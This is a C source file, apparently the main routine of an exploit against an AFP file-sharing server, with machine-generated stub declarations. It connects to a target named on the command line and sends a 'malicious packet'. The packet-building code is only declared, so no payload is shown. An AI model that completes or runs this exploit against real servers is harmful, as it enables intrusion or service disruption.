
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct timeval {int tv_usec; scalar_t__ tv_sec; } ;
typedef int fd_set ;


 int BUFSIZE ;
 int FD_SET (int,int *) ;
 int FD_ZERO (int *) ;
 int banner () ;
 int close (int) ;
 scalar_t__ connect_afp (char*,int*) ;
 int exit (int) ;
 int generate_packet (char*) ;
 int printf (char*,...) ;
 int select (int,int *,int *,int *,struct timeval*) ;
 scalar_t__ send_packet (char*,int*) ;
 int usage (char*) ;

int main(int ac, char **av)
{
       int sockfd;
       char packet[BUFSIZE];
       struct timeval time;

       banner();
       if(ac != 2) {
               usage(*av);
       }
       printf("[+] Connecting to target: %s.\n",av[1]);
       if(connect_afp(av[1],&sockfd)) {
               printf("[-] An error has occured connecting to the target.\n");
               exit(1);
       }

       printf("[+] Generating malicious packet.\n");
       generate_packet(packet);

       printf("[+] Sending packet to target.\n");
       if(send_packet(packet,&sockfd)) {
               printf("[-] Error sending packet.\n");
               close(sockfd);
               exit(1);
       }

       fd_set mySet;
       FD_ZERO(&mySet);
       FD_SET(sockfd, &mySet);
       time.tv_sec = 0;
       time.tv_usec = 50;
       select(sockfd+1, &mySet, ((void*)0), ((void*)0), &time);

       close(sockfd);
       return 0;
}
